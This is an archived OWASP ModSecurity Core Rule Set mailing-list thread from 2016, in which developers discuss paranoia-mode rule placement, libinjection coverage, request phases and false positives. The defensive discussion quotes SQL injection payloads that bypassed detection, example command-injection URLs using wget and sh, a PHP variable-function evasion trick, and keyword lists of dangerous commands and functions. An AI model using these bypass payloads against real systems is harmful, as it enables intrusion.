https://github.com/client9/libinjection/pulse/monthly
But it's still an almost exclusive and I am convinced nobody outside
Nick did a through code review. Meanwhile Chaim told me, libinjection is
included in other WAF products as well and I agree it is a great
piece of code. It's just that I feel uneasy with the state of the
project and the linking of it into my parameter parser aimed to
stop evil attackers (trying to exploit libinjection).

With that being said, the blogpost above showed me, that libinjection
is able to detect a great many sqli and xss attacks. But it is far
from complete. (See blogpost for numbers) So I think it is _one_ rule
in a set of rules aimed to stop sqli and xss. Diversity is key.

Also: A realworld sqlinjection typically triggers a variety of
anti-sqli rules. With _only_ libinject it would be a single critical
alert.

> If libinjection in itself already has a high sensitivity, the benefits of the regexp based rules will become lower. After all, an attack will then likely already be flagged without those rules. In that case, we could move rules from normal to paranoid mode, or dismiss currently removed rules, much more easily.

I see your point. I think that would work in strict blocking mode.
In anomaly scoring mode, it would only work with a anomaly scoring
limit of 5 or lower. Otherwise, sqlinjections would simply trigger
libinjection, but fly under the radar of the final blocking rule.

Thanks for your input and food for thought. Interesting.

Ahoj,

Christian


-- 
People demand freedom of speech as a compensation for the freedom 
of thought which they seldom use.
-- Soren Kierkegaard

From christian.folini at netnea.com  Thu Feb  4 09:52:00 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Thu, 4 Feb 2016 10:52:00 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Mechanics Proposal
Message-ID: <20160204095200.GA28896@elias>

Dear all,

With the progress we are making on the rules front, it is time to
talk about the way it could be implemented. 
It's time for the show-me-the-code. He you go:

https://www.netnea.com/cms/2016/02/04/owasp-modsecurity-core-rules-paranoia-mode-mechanics-proposal/

Feedback welcome!

Christian


-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From aymeric.chaib at morpho.com  Thu Feb  4 10:29:44 2016
From: aymeric.chaib at morpho.com (CHAIB Aymeric (MORPHO))
Date: Thu, 4 Feb 2016 10:29:44 +0000
Subject: [Owasp-modsecurity-core-rule-set] Phase request
Message-ID: <ab177ae2f7ee416ab07bedb7f82b1319@Y0032XE.rd1.rf1>

Hello there,

I noticed that the version 3 of CRS ruleset sometimes transforms the rule phase: from phase:1 (v2.2.9) to phase:request. But phase:request just translates to phase:2 (request body) and, if I understand the phase processing correctly, requests that do not contain a body will not be checked against phase:2 rules. (Well, this is what I observe in my debugging logs. Don't know if it is the ModSecurity standard behavior or if it comes from my implementation.)

A typical example is the rule id 960911 (REQUEST-20-PROTOCOL-ENFORCEMENT) which validates the HTTP request line: it seems to me that it should be validated for requests including those without body, but the phase is now phase:request on CRS v3.

Besides, there are a lot of other examples in REQUEST-21-PROTOCOL-ATTACK where it seems to me that the rules should be put on phase:1. (E.g. smuggling, response splitting.)
The same applies to REQUEST-10-IP-REPUTATION.

Do I miss something ? Is this a conscious choice ?
Thanks for enlightening me.

Regards,
Aymeric Chaib

#
" This e-mail and any attached documents may contain confidential or proprietary information. If you are not the intended recipient, you are notified that any dissemination, copying of this e-mail and any attachments thereto or use of their contents by any means whatsoever is strictly prohibited. If you have received this e-mail in error, please advise the sender immediately and delete this e-mail and all attached documents from your computer system."
#
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160204/7520f631/attachment.html>

From christian.folini at time-machine.ch  Thu Feb  4 19:56:33 2016
From: christian.folini at time-machine.ch (Christian Folini)
Date: Thu, 4 Feb 2016 20:56:33 +0100
Subject: [Owasp-modsecurity-core-rule-set] Phase request
In-Reply-To: <ab177ae2f7ee416ab07bedb7f82b1319@Y0032XE.rd1.rf1>
References: <ab177ae2f7ee416ab07bedb7f82b1319@Y0032XE.rd1.rf1>
Message-ID: <20160204195633.GA19405@elias>

Aymeric,

On Thu, Feb 04, 2016 at 10:29:44AM +0000, CHAIB Aymeric (MORPHO) wrote:
> I noticed that the version 3 of CRS ruleset sometimes transforms the rule phase: from phase:1 (v2.2.9) to phase:request. But phase:request just translates to phase:2 (request body) and, if I understand the phase processing correctly, requests that do not contain a body will not be checked against phase:2 rules. (Well, this is what I observe in my debugging logs. Don't know if it is the ModSecurity standard behavior or if it comes from my implementation.)

It's a bit different.

Traditionally ModSec has 5 phases:
1 
2 
3 
4
5

5 is the logging phase when the request is already over.
3 and 4 are the response header and response body phases.

With 1 and 2 things are more complicated.

1 used to be the phase running after the requests headers
where received. But then people constantly complained the
rules in containers as directory / location would simply 
be ignored (container springing into action only when the
request body was received). So Ivan Risti? (somebody correct 
me if it was not him) gave up and pushed phase 1 on the same 
apache hook as phase 2.

This means, that phase 1 runs on the same apache hook
as phase 2. But phase 1 runs before phase 2. (which is
a neat detail for some of the more adventurous rule
contructs).

The method (or the fact that a request has a body or not)
is irrelevant for the phases. Phase 2 happens no matter
if there is a body or not.

If you are not happy with the merging of phase 1 and phase
2, then you can compile ModSec with the option
--enable-request-early. That is a good practice in my eyes.
For it allows you to block a request _before_ you
start to receive the request body. This could come to your 
advantage in special situations like the prevention of
file uploads etc.

Lately, some of the phases received an alias:
 2 - request
 4 - response
 5 - logging

But that's just an alias.

Hope this helps. So it was a conscious move, but that does not
mean that I think the general shift of rules onto phase 2 was
a very good idea.

Ahoj,

Christian




> 
> A typical example is the rule id 960911 (REQUEST-20-PROTOCOL-ENFORCEMENT) which validates the HTTP request line: it seems to me that it should be validated for requests including those without body, but the phase is now phase:request on CRS v3.
> 
> Besides, there are a lot of other examples in REQUEST-21-PROTOCOL-ATTACK where it seems to me that the rules should be put on phase:1. (E.g. smuggling, response splitting.)
> The same applies to REQUEST-10-IP-REPUTATION.
> 
> Do I miss something ? Is this a conscious choice ?
> Thanks for enlightening me.
> 
> Regards,
> Aymeric Chaib
> 
> #
> " This e-mail and any attached documents may contain confidential or proprietary information. If you are not the intended recipient, you are notified that any dissemination, copying of this e-mail and any attachments thereto or use of their contents by any means whatsoever is strictly prohibited. If you have received this e-mail in error, please advise the sender immediately and delete this e-mail and all attached documents from your computer system."
> #

> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set


From modsec at spam.lifeforms.nl  Sat Feb  6 15:23:04 2016
From: modsec at spam.lifeforms.nl (Walter Hop)
Date: Sat, 6 Feb 2016 16:23:04 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
	candidate 950120 / 931130 (Possible RFI)
In-Reply-To: <20160204090826.GA27990@elias>
References: <20160202080600.GA29931@elias>
	<8F47FE1E-C1DA-4B07-85FD-3A8C2E3B119C@spam.lifeforms.nl>
	<20160204090826.GA27990@elias>
Message-ID: <589BCC4A-9687-44F9-8780-5A40A3F63A40@spam.lifeforms.nl>

> On 04 Feb 2016, at 10:08, Christian Folini <christian.folini at netnea.com> wrote:
> 
> With that being said, the blogpost above showed me, that libinjection
> is able to detect a great many sqli and xss attacks. But it is far
> from complete. (See blogpost for numbers) So I think it is _one_ rule
> in a set of rules aimed to stop sqli and xss. Diversity is key.
> 
> Also: A realworld sqlinjection typically triggers a variety of
> anti-sqli rules. With _only_ libinject it would be a single critical
> alert.


I?ve done a little testdrive with the CRS v3.0.0-rc1 rules today and the coverage of libinjection for MySQL is pretty complete actually!

When scanning a little vulnerable test app with the dev version of sqlmap in two configurations: (1) --random-agent and (2) --random-agent --dbms=mysql, the complete CRS v3.0.0-rc1 detected all attempts with mostly high anomaly scores.

Then I disabled all CRSv3?s SQLi and XSS rules, except libinjection's @detectSQLi rule. Similarly, almost all attempts were detected just by libinjection alone! Out of 380 malicious requests, only the following examples were let through by libinjection:

select * from foo where id=1,."'.""',)
select * from foo where id=1'wqffhb<'">wweNuE
select * from foo where id=1) WAITFOR DELAY '0:0:5' AND (9227=9227
select * from foo where id=1 WAITFOR DELAY '0:0:5'
select * from foo where id=1') WAITFOR DELAY '0:0:5' AND ('UUAn'='UUAn
select * from foo where id=1' WAITFOR DELAY '0:0:5' AND 'AzTu'='AzTu
select * from foo where id=1%' WAITFOR DELAY '0:0:5' AND '%'='

(WAITFOR DELAY is Microsoft SQL dialect, usable for blind injection. I?ll try this again with a newer libinjection, and if necessary report it upstream.)

Resuming, libinjection?s sensitivity in detecting SQLi is already very impressive! So if we ever should find a large false positive rate in an SQLi rule in the future, we don?t need to be too sentimental about that single rule, as the addition of libinjection in CRS v3 ensures that SQLi should start with a nice anomaly score already.

However, I agree with you completely that it?s preferable to leave in any useful regexp based rules that we have. I was just curious about libinjection since it was an unknown factor to me.

I?ll comment on the individual rules later!

-- 
Walter Hop | PGP key: https://lifeforms.nl/pgp

-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160206/7d8ebbb7/attachment.html>

From CSanders at trustwave.com  Sat Feb  6 15:53:06 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Sat, 6 Feb 2016 15:53:06 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 950120 / 931130 (Possible RFI)
In-Reply-To: <589BCC4A-9687-44F9-8780-5A40A3F63A40@spam.lifeforms.nl>
References: <20160202080600.GA29931@elias>
	<8F47FE1E-C1DA-4B07-85FD-3A8C2E3B119C@spam.lifeforms.nl>
	<20160204090826.GA27990@elias>
	<589BCC4A-9687-44F9-8780-5A40A3F63A40@spam.lifeforms.nl>
Message-ID: <D2DB8063.174F6%csanders@trustwave.com>

This is very helpful, recently I've come to share in some views of the community that libinjection isn't the most well supported/reviewed of all the projects on github. Fortunately compared to many other projects it is quite small from a codebase perspective and as a result the attack surface isn't outrageous, and reviewing it is reasonable. That being said we NEED to continue to including other rules that suppliment libinjection in case of a bypass, which is what we do in v3.0.0-rc1 :)

From: <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org>> on behalf of Walter Hop <modsec at spam.lifeforms.nl<mailto:modsec at spam.lifeforms.nl>>
Date: Saturday, February 6, 2016 at 10:23 AM
To: "owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>" <owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>>
Subject: Re: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950120 / 931130 (Possible RFI)

On 04 Feb 2016, at 10:08, Christian Folini <christian.folini at netnea.com<mailto:christian.folini at netnea.com>> wrote:

With that being said, the blogpost above showed me, that libinjection
is able to detect a great many sqli and xss attacks. But it is far
from complete. (See blogpost for numbers) So I think it is _one_ rule
in a set of rules aimed to stop sqli and xss. Diversity is key.

Also: A realworld sqlinjection typically triggers a variety of
anti-sqli rules. With _only_ libinject it would be a single critical
alert.

I've done a little testdrive with the CRS v3.0.0-rc1 rules today and the coverage of libinjection for MySQL is pretty complete actually!

When scanning a little vulnerable test app with the dev version of sqlmap in two configurations: (1) --random-agent and (2) --random-agent --dbms=mysql, the complete CRS v3.0.0-rc1 detected all attempts with mostly high anomaly scores.

Then I disabled all CRSv3's SQLi and XSS rules, except libinjection's @detectSQLi rule. Similarly, almost all attempts were detected just by libinjection alone! Out of 380 malicious requests, only the following examples were let through by libinjection:

select * from foo where id=1,."'.""',)
select * from foo where id=1'wqffhb<'">wweNuE
select * from foo where id=1) WAITFOR DELAY '0:0:5' AND (9227=9227
select * from foo where id=1 WAITFOR DELAY '0:0:5'
select * from foo where id=1') WAITFOR DELAY '0:0:5' AND ('UUAn'='UUAn
select * from foo where id=1' WAITFOR DELAY '0:0:5' AND 'AzTu'='AzTu
select * from foo where id=1%' WAITFOR DELAY '0:0:5' AND '%'='

(WAITFOR DELAY is Microsoft SQL dialect, usable for blind injection. I'll try this again with a newer libinjection, and if necessary report it upstream.)

Resuming, libinjection's sensitivity in detecting SQLi is already very impressive! So if we ever should find a large false positive rate in an SQLi rule in the future, we don't need to be too sentimental about that single rule, as the addition of libinjection in CRS v3 ensures that SQLi should start with a nice anomaly score already.

However, I agree with you completely that it's preferable to leave in any useful regexp based rules that we have. I was just curious about libinjection since it was an unknown factor to me.

I'll comment on the individual rules later!

--
Walter Hop | PGP key: https://lifeforms.nl/pgp<http://scanmail.trustwave.com/?c=4062&d=1ZW21qA6mVzaHrUP30VymOueR3E0w4jjrmj3ltOfGA&s=5&u=https%3a%2f%2flifeforms%2enl%2fpgp>


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160206/9b4a1fc6/attachment-0001.html>

From modsec at spam.lifeforms.nl  Sat Feb  6 19:42:26 2016
From: modsec at spam.lifeforms.nl (Walter Hop)
Date: Sat, 6 Feb 2016 20:42:26 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
	candidate 950120 / 931130 (Possible RFI)
In-Reply-To: <20160202080600.GA29931@elias>
References: <20160202080600.GA29931@elias>
Message-ID: <44545D09-6265-438E-B743-5564241D5336@spam.lifeforms.nl>

> Controversial Paranoia Mode Candidate 950120 (2.2.X) / 931130 (3.0.0rc1)
> msg: Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link 
> 
> [?]
> 
> In my blogpost at
> https://www.netnea.com/cms/2016/01/17/most-frequent-false-positives-triggered-by-owasp-modsecurity-core-rules-2-2-x/
> I identified the said rule as one with very few false positives. Walter however brought it up as a rule with many false positives.
> 
> A wider perspective is thus needed.
> 
> Does anybody has anything to add?

To talk about my opinion of with this rule a bit, it?s super easy to trigger it.
Just any text input for a URL will do.
For example: http://example/?url=https://yahoo.com/

That is super common and bound to give various false positives on registration forms, contact forms, blog comment forms, etcetera. Firing on any plain URL submitted in a form? That?s a prime example of being paranoid :)

Whether the rule annoys a user depends on the blocking score I guess. I personally block on first sight and think everybody should. As you guys said, with SQLi and XSS you usually get high scores, but with this type of vulnerability you just get one shot.

What could improve false positives?
- I have multiple whitelistings for this rule on ARGS:url. If I was non-paranoid, I would assume that IF a web application accepts a parameter called ?url?, it?s pretty likely that this was intended to be a URL field and not an avenue for RFI. So ARGS:url could be excluded in normal mode.
- From a quick log grep, people absolutely LOVE to do LFI and RFI on parameters like ARGS:page and ARGS:id. Maybe others have more suggestions.

My recommendation would be:
1) Put the full rule in paranoid set
2) In the basic set, clone this rule, but ensure it doesn?t work on ARGS:url
3) In the basic set, possibly consider raising the anomaly score if it?s sent as ARGS:id, ARGS:page

-- 
Walter Hop | PGP key: https://lifeforms.nl/pgp

-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160206/24ce4b27/attachment.html>

From modsec at spam.lifeforms.nl  Sat Feb  6 22:04:00 2016
From: modsec at spam.lifeforms.nl (Walter Hop)
Date: Sat, 6 Feb 2016 23:04:00 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
	candidate 950907 / 932100 (System command injection)
In-Reply-To: <20160202081718.GB29931@elias>
References: <20160202081718.GB29931@elias>
Message-ID: <69CE0D94-2054-443C-8336-033DCCB33934@spam.lifeforms.nl>


> On 02 Feb 2016, at 09:17, Christian Folini <christian.folini at netnea.com> wrote:
> 
> Controversial Paranoia Mode Candidate 950907 (2.2.X) / 932100 (3.0.0rc1)
> msg: Sytem Command Injection
> 
> [?]
> This rule is controversial for different reasons than the one in the previous post.
> 
> It was a simple regex in 2.2.X. For 3.0.0 it has been enriched with a
> data file:
> https://raw.githubusercontent.com/SpiderLabs/owasp-modsecurity-crs/v3.0.0-rc1/rules/os-commands.data
> 
> In a response to my blogpost 
> https://www.netnea.com/cms/2015/12/20/modsec-crs-2-2-x-vs-3-0-0-dev/
> Chaim conceded the 3.0.0 version is still plagued by a lot of false
> positives. Obviously so, if you look at the commands. After all, unix
> commands are close to natural English for a good reason.
> 
> Now Franziska (collaborating on the paranoia mode) and I wonder if 
> it would not make sense to split
> os-commands.data into two or more files. The commands with few
> false positives would remain in the standard file, commands generating
> lots of false positives could then be moved into
> os-commands-paranoia.data and be referenced in a separate rule
> copying the behaviour of the standard rule.
> 
> Thoughts?

I like the idea of splitting the file.

Overall I'm not satisfied with this new rule yet. I think the regexp needs some love too.

I agree some of the words in os-commands.data seem rather paranoid. Words like "choice", "help", "now? seem of low value and are common in natural text. Also, the large number of Unix-only environments could skip Windows related commands. It?s hard for users to modify these lists as you?d have to hack the CRS, and these huge collections are to maintain anyhow, so I agree we need granularity.

The rule has some regexp magic to prevent false positives, but the balance is not a complete success in my opinion. For instance, the following URLs don't trigger in CRSv3:
http://vuln/?cmd=wget%20http://example.com/blah.txt
http://vuln/?cmd=sh%20blah.txt

So it's not as strong as you would want either to prevent some common RCE.
Something like http://vuln/?cmd=Wget%20http://example.com/;%20ecHo does trigger it.

My ideas about this:

1) I think that a user should check their desired platforms in the setup conf. In fact, this would be great to do anyway in the initial 3.0.0 release even if we DON'T look at it in any rule yet. Specifying platform types will pave the way for reducing false positives and false negatives by skipping unnecessary checks and being more strict on the right platforms. So we could start by listing these platforms in the existing rule in the setup conf. Example:

	SecAction \
	  "id:'900024', \
	  phase:1, \
	  t:none, \
	  setvar:tx.unix=1, \
	  setvar:tx.windows=1, \
	  setvar:tx.java=1, \
	  setvar:tx.php=1, \
	  ...

(By the way: I think it?s unfortunate that a user has to use value 1 to enable a check. An undefined variable will mean that the CRS will skip some rules. This makes it dangerous to introduce a new variable in the CRS later; all existing installations MUST then add this variable to their setup rule immediately, or suffer from reduced security. It?s better to use a scheme that defaults to ?on?. A convention like ?tx.disable_mysql=1? would be user unfriendly and error-prone. But we could check for an explicit ?off? string, e.g. ?setvar:tx.mysql=off?. If it?s not ?off? then assume that the user DOES want the check. I think it?s important to get this right in 3.0.0, it will be more painful to do it later.)

2) Separate the words into multiple lists:
	os-commands-critical.data (absolute red flag list: "curl", "passwd", "sh", "uname", "wget" etc.)
	os-commands-paranoid.data (absolute low value, but high FP natural words like "choice")
	os-commands-windows.data (all Windows commands)
	os-commands-common.data (all other commands)

3) Review the current regexp against some test data and CRSv2 to make it more sensitive

4) Split the rule as follows:

- "os-commands-critical.data": should be checked super strictly with a simple regexp and produce a critical score. My two example commands should definitely be blocked.
- "os-commands-windows.data": use current algorithm, but only run this rule if the user is interested in Windows. (The inverse is probably not useful: a Windows system can have typical unix-like "wget" or "curl" binaries, so I think "os-commands-unix.data" is probably not wise to have.)
- "os-commands-common.data": use current algorithm
- "os-commands-paranoid.data": use current algorithm, paranoid mode only.

-- 
Walter Hop | PGP key: https://lifeforms.nl/pgp

-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160206/53b67199/attachment.html>

From modsec at spam.lifeforms.nl  Sun Feb  7 13:58:32 2016
From: modsec at spam.lifeforms.nl (Walter Hop)
Date: Sun, 7 Feb 2016 14:58:32 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
	candidate 958977 / 933110 and 958979 / 933120 (PHP Injection
	Attacks)
In-Reply-To: <20160202082502.GC29931@elias>
References: <20160202082502.GC29931@elias>
Message-ID: <54703590-4F48-4A1B-9271-E1E29A45FE39@spam.lifeforms.nl>

On 02 Feb 2016, at 09:25, Christian Folini <christian.folini at netnea.com> wrote:
> 
> Like the previous post on 950907 / 932100, this is controversial because
> of possible false positives due to a data file with strings:
> https://raw.githubusercontent.com/SpiderLabs/owasp-modsecurity-crs/v3.0.0-rc1/rules/php-function-names.data
> https://raw.githubusercontent.com/SpiderLabs/owasp-modsecurity-crs/v3.0.0-rc1/rules/php-config-directives.data
> 
> Could these files be split in the manner explained in the message
> before?
> 
> After all, this rule scans input against strings like
> dl, eval, exec, from, precision.

I would advocate the same separation as in my previous post re os-commands.
But we need a little more firepower for PHP in my opinion.
A detailed approach could go like this...

1) Have the user indicate with setvar if they want to protect PHP, and predicate the rules on that. All the non PHP shops will be solved from FP instantly!

2) We need to review the current data file:
- I?m missing some stuff there that I see in the wild every day such as: gzinflate, gzdecode, gzuncompress, strrev, zlib_decode?
- I also see in some cases the parenthesis is added, like: /file(/ and /assert(/. This seems easy to evade. In PHP, calling ?assert      ($foo)? or ?assert\t\t\t($foo)? is just as valid. In this case, it was probably done because those terms lead to FP. If so, we might move super common terms with relatively low attacker interest, like assert, to the paranoid list. But, in any case they should become more robust regexps like ?\bfile\s*(?.

3) Separate the data file. Start with a small ?php-commands-critical.data? list. This should contain the usual suspects used for:
- obfuscation: base64_decode, gzdecode, etc...
- execution: passthru, proc_open, shell_exec, call_user_func, require_once, include_once...
- IO: file_get_contents, file_put_contents, fopen, fwrite...
- environment inspection and setting: error_reporting, function_exists, ini_set, auto_prepend_file, sys_get_temp_dir...

If any of those strings is present, it?s certainly an attack, except for that single person who runs a PHP-related wiki. The list should only contain the real red flags, don?t try to cleverly prevent FP using complex regexps, and cannot contain any common English words (so unfortunately ?require? and ?include? are off limits...)

4) Other functions could go in ?php-commands-functions.data?. This list would be small and contain only *proper functions* having PHP syntax ?function()? and have names often used in natural text. To prevent FP we look for the parenthesis. Let?s take example ?system?, this is often found in natural text, but an attacker wants to do ?system(? so they need parentheses and a word boundary at the start. So a regexp might look like "\bsystem\s*\(?. Because we have the regexp, FP is lowered. It would still match stuff like ?F*ck the system (yeah yeah)? 

5) Other PHP related terms could stay in ?php-commands-common.data?. This would list the PHP commands and terms of lesser interest.

6) We?ll have to review if there are terms which are so common in natural text that they?ll have to be moved to ?php-commands-paranoid.data?. I think this list might be as small as possible. Maybe stuff like ?dl?, ?require?, ?include?. It?s still likely to produce FP...

7) String matching for PHP functions is not powerful enough. We need generic rules that prevent PHP evasion. I don?t remember seeing this in the wild, but an easy way to evade textual signature matches would be PHP variable functions (http://php.net/manual/en/functions.variable-functions.php). For instance, you can do the following to get around the CRS:

$aB_4c = 'fil' . 'e_get' . '_contents';
$aB_4c('...'); 

So we want a generic signature to detect variable function call syntax. Fortunately its syntax is very uncommon in natural text, so I?d advocate putting this rule in normal mode.

Anyway my ?0.02 or maybe a bit more :)



From modsec at spam.lifeforms.nl  Sun Feb  7 14:22:03 2016
From: modsec at spam.lifeforms.nl (Walter Hop)
Date: Sun, 7 Feb 2016 15:22:03 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
	candidate 960015 / 920300 and 960017 / 920350 (Header issues)
In-Reply-To: <20160202083257.GD29931@elias>
References: <20160202083257.GD29931@elias>
Message-ID: <E4C53A5B-D359-4E59-B137-659E4EB926C6@spam.lifeforms.nl>

On 02 Feb 2016, at 09:32, Christian Folini <christian.folini at netnea.com> wrote:
> 
> With 960017 / 920350 (Host header is a numeric IP address), 
> the situation is slightly different. We agree it is a frequent
> source of false positives, but Walter thinks it is not legitimate
> users that are affected, but mass scanners. In my experience
> it is load balancers and health checkers which fall into this
> category as well. And stopping scanners is possibly behind the
> scope of a ModSec Core Rules vanilla install.
> 
> So what do we do with this rule?

I don?t disagree with you. I didn?t discourage moving it to paranoid, that would be no problem at all.

In my logs I only see mass scanners trying this, and there is one vendor appliance which is doing ?compliance? checks on an IP address constantly. This appliance annoys me: you don?t even know my HOSTNAME and you make claims about my site actually being working and compliant? And people pay money for that? I like blocking that thing out of spite, but that?s just personal.

Anyway, you?ve given some good cases for allowing IP addresses, it?s not too controversial.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160207/464f6c38/attachment.html>

From CSanders at trustwave.com  Sun Feb  7 15:30:39 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Sun, 7 Feb 2016 15:30:39 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 960015 / 920300 and 960017 / 920350 (Header issues)
In-Reply-To: <E4C53A5B-D359-4E59-B137-659E4EB926C6@spam.lifeforms.nl>
References: <20160202083257.GD29931@elias>
	<E4C53A5B-D359-4E59-B137-659E4EB926C6@spam.lifeforms.nl>
Message-ID: <D2DCCCDC.1750F%csanders@trustwave.com>

It's kind of a mixed bag because we still want ModSecurity to be effective at blocking the easy rift raft (opportunistic attackers) but we want it to be easy to configure. Perhaps we make a 'domain name' configuration in the setup.conf and if it has been configured the rule comes into effect. I don't know that IF they have a domain we see too many false positives, most are things that as walter described, are just laziness. Thoughts?


From: <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org>> on behalf of Walter Hop <modsec at spam.lifeforms.nl<mailto:modsec at spam.lifeforms.nl>>
Date: Sunday, February 7, 2016 at 9:22 AM
To: "owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>" <owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>>
Subject: Re: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 960015 / 920300 and 960017 / 920350 (Header issues)

On 02 Feb 2016, at 09:32, Christian Folini <christian.folini at netnea.com<mailto:christian.folini at netnea.com>> wrote:

With 960017 / 920350 (Host header is a numeric IP address),
the situation is slightly different. We agree it is a frequent
source of false positives, but Walter thinks it is not legitimate
users that are affected, but mass scanners. In my experience
it is load balancers and health checkers which fall into this
category as well. And stopping scanners is possibly behind the
scope of a ModSec Core Rules vanilla install.

So what do we do with this rule?

I don't disagree with you. I didn't discourage moving it to paranoid, that would be no problem at all.

In my logs I only see mass scanners trying this, and there is one vendor appliance which is doing "compliance" checks on an IP address constantly. This appliance annoys me: you don't even know my HOSTNAME and you make claims about my site actually being working and compliant? And people pay money for that? I like blocking that thing out of spite, but that's just personal.

Anyway, you've given some good cases for allowing IP addresses, it's not too controversial.

________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160207/1e4c5314/attachment-0001.html>

From CSanders at trustwave.com  Sun Feb  7 15:46:32 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Sun, 7 Feb 2016 15:46:32 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 958977 / 933110 and 958979 / 933120 (PHP Injection Attacks)
In-Reply-To: <54703590-4F48-4A1B-9271-E1E29A45FE39@spam.lifeforms.nl>
References: <20160202082502.GC29931@elias>
	<54703590-4F48-4A1B-9271-E1E29A45FE39@spam.lifeforms.nl>
Message-ID: <D2DCD071.1752C%csanders@trustwave.com>

I like the ideas. The first thing I?d note is that individuals are free to
exclude or remove entire files so as long as the PHP file is named
REQUEST-XYZ-PHP-XYZ people running ASP should get this hint (hopefully)
this is why we name them in this way. In terms of splitting the files, I
most certainly agree with the ?critical?. Again I caution against
splitting data files TOO finely as it will get confusing to support your
own instance but this is just a minor issue. As for those parenthesis. You
are right and this is actually my fault. I added them to prevent false
positives being reported commonly on Cpanel.

On 2/7/16, 8:58 AM,
"owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
Walter Hop" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on
behalf of modsec at spam.lifeforms.nl> wrote:

>On 02 Feb 2016, at 09:25, Christian Folini <christian.folini at netnea.com>
>wrote:
>>
>> Like the previous post on 950907 / 932100, this is controversial because
>> of possible false positives due to a data file with strings:
>>
>>http://scanmail.trustwave.com/?c=4062&d=7tO31v4ao2_NNeZ84J8wNSWydu00_AAPk
>>vSmewhU_w&s=5&u=https%3a%2f%2fraw%2egithubusercontent%2ecom%2fSpiderLabs%
>>2fowasp-modsecurity-crs%2fv3%2e0%2e0-rc1%2frules%2fphp-function-names%2ed
>>ata
>>
>>http://scanmail.trustwave.com/?c=4062&d=7tO31v4ao2_NNeZ84J8wNSWydu00_AAPk
>>qKjKQ1VqQ&s=5&u=https%3a%2f%2fraw%2egithubusercontent%2ecom%2fSpiderLabs%
>>2fowasp-modsecurity-crs%2fv3%2e0%2e0-rc1%2frules%2fphp-config-directives%
>>2edata
>>
>> Could these files be split in the manner explained in the message
>> before?
>>
>> After all, this rule scans input against strings like
>> dl, eval, exec, from, precision.
>
>I would advocate the same separation as in my previous post re
>os-commands.
>But we need a little more firepower for PHP in my opinion.
>A detailed approach could go like this...
>
>1) Have the user indicate with setvar if they want to protect PHP, and
>predicate the rules on that. All the non PHP shops will be solved from FP
>instantly!
>
>2) We need to review the current data file:
>- I?m missing some stuff there that I see in the wild every day such as:
>gzinflate, gzdecode, gzuncompress, strrev, zlib_decode?
>- I also see in some cases the parenthesis is added, like: /file(/ and
>/assert(/. This seems easy to evade. In PHP, calling ?assert      ($foo)?
>or ?assert\t\t\t($foo)? is just as valid. In this case, it was probably
>done because those terms lead to FP. If so, we might move super common
>terms with relatively low attacker interest, like assert, to the paranoid
>list. But, in any case they should become more robust regexps like
>?\bfile\s*(?.
>
>3) Separate the data file. Start with a small
>?php-commands-critical.data? list. This should contain the usual suspects
>used for:
>- obfuscation: base64_decode, gzdecode, etc...
>- execution: passthru, proc_open, shell_exec, call_user_func,
>require_once, include_once...
